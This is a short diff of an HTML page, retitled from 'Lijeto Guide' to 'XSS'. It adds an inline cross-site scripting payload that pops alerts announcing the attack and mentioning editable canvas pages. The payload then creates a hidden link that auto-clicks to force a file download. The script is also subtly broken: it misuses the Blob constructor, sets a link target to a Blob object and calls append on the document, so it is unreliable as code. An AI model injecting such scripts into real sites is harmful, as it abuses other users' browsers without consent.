@@ -2,9 +2,22 @@
 <html>
   <head>
     <title>
-      Lijeto Guide
+      XSS
     </title>
   </head>
   <body>
+    <script>
+      alert("Cross Site Scripting attack!");
+      alert("Because canvas allows html editing I added a small iframe!");
+      filename="haha.txt";
+      filedata="XSS";
+      var blob = new Blob(filedata,{"type":"octet/stream"});
+      var a = document.createElement('a');
+      document.append(a);
+      a.style="display: none;";
+      a.href=blob;
+      a.download=filename;
+      a.click();
+    </script>
   </body>
 </html>
